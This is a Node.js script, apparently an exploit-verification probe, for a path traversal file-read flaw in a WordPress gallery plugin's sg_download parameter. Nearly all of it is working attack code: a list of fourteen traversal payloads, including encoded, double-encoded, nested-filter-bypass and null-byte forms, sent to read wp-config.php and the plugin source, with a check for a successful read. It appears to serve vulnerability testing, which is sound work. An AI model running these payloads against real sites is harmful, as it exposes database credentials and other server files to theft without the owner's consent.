// probe.mjs - exploit-verification probe for the Simple Gallery `sg_download`
// path traversal (arbitrary file read, CVE-2026-90002).
//
// Usage:  node probe.mjs <base-url>      e.g.  node probe.mjs http://127.0.0.1:8194
//
// Exit codes:
//   0  VULNERABLE - at least one traversal variant returned the contents of a
//      known server-side file (matched by content, not by filename).
//   1  NOT VULNERABLE - no variant returned known file contents (e.g. 404s),
//      or the target could not be reached / verified.
//
// Safety: sends only HTTP GET requests to the given base URL (redirects are not
// followed, so nothing else is contacted). It changes no state on the target and
// writes no files.

const arg = process.argv[2];
if (process.argv.length !== 3 || !arg) {
  console.error('usage: node probe.mjs <base-url>');
  process.exit(1);
}

let prefix;
try {
  const u = new URL(arg);
  if (u.protocol !== 'http:' && u.protocol !== 'https:') throw new Error('bad protocol');
  u.search = '';
  u.hash = '';
  prefix = u.href.replace(/\/+$/, '');
} catch {
  console.error('invalid base url');
  process.exit(1);
}

// Known-content markers. They are checked against the response body, so they do
// not depend on the name of the requested file.
const WP_CONFIG_MARK = 'DB_NAME';                      // defined in wp-config.php
const PLUGIN_MARK = 'Plugin Name: Simple Gallery';     // header of the plugin's own PHP file

// The gallery directory is <uploads>/simple-gallery/, so from there:
//   ../ -> uploads, ../../ -> wp-content, ../../../ -> ABSPATH (wp-config.php)
//   ../../plugins/ -> wp-content/plugins
// Variants cover the textbook payload plus common encodings and "filter bypass"
// forms, so a partial fix (e.g. stripping only a literal "../") is still caught.
const VARIANTS = [
  { name: 'plain ../',                 payload: '../../../wp-config.php',                       mark: WP_CONFIG_MARK },
  { name: 'encoded slash %2f',         payload: '..%2f..%2f..%2fwp-config.php',                mark: WP_CONFIG_MARK },
  { name: 'encoded slash %2F (upper)', payload: '..%2F..%2F..%2Fwp-config.php',                mark: WP_CONFIG_MARK },
  { name: 'fully encoded dots+slash',  payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php',    mark: WP_CONFIG_MARK },
  { name: 'nested ....// bypass',      payload: '....//....//....//wp-config.php',             mark: WP_CONFIG_MARK },
  { name: 'nested ..././ bypass',      payload: '..././..././..././wp-config.php',             mark: WP_CONFIG_MARK },
  { name: 'double-encoded %252f',      payload: '..%252f..%252f..%252fwp-config.php',          mark: WP_CONFIG_MARK },
  { name: 'encoded filename char',     payload: '..%2f..%2f..%2f%77p-config.php',              mark: WP_CONFIG_MARK },
  { name: 'extension-append null byte', payload: '../../../wp-config.php%00.svg',              mark: WP_CONFIG_MARK },
  { name: 'backslash separators',      payload: '..\\..\\..\\wp-config.php',                   mark: WP_CONFIG_MARK },
  { name: 'extra depth ../',           payload: '../../../../wp-config.php',                   mark: WP_CONFIG_MARK },
  { name: 'plugin file ../',           payload: '../../plugins/simple-gallery/simple-gallery.php', mark: PLUGIN_MARK },
  { name: 'plugin file encoded',       payload: '..%2f..%2fplugins%2fsimple-gallery%2fsimple-gallery.php', mark: PLUGIN_MARK },
  { name: 'plugin file ....// bypass', payload: '....//....//plugins/simple-gallery/simple-gallery.php', mark: PLUGIN_MARK },
];

let reached = false;

for (const v of VARIANTS) {
  // Build the query string by hand so the payload's encoding is sent exactly as written.
  const url = `${prefix}/?sg_download=${v.payload}`;
  let res;
  let body;
  try {
    res = await fetch(url, { redirect: 'manual', signal: AbortSignal.timeout(10000) });
    body = await res.text();
    reached = true;
  } catch (err) {
    console.log(`[error] ${v.name}: ${err.message}`);
    continue;
  }

  const hit = res.status === 200 && body.includes(v.mark);
  console.log(`[${hit ? 'HIT ' : 'miss'}] ${v.name} -> HTTP ${res.status}, ${body.length} bytes`);

  if (hit) {
    console.log(`VULNERABLE: arbitrary file read via sg_download ("${v.name}").`);
    process.exit(0);
  }
}

if (!reached) {
  console.log('NOT VERIFIED: target unreachable; could not confirm vulnerability.');
} else {
  console.log('NOT VULNERABLE: no traversal variant returned known file contents.');
}
process.exit(1);
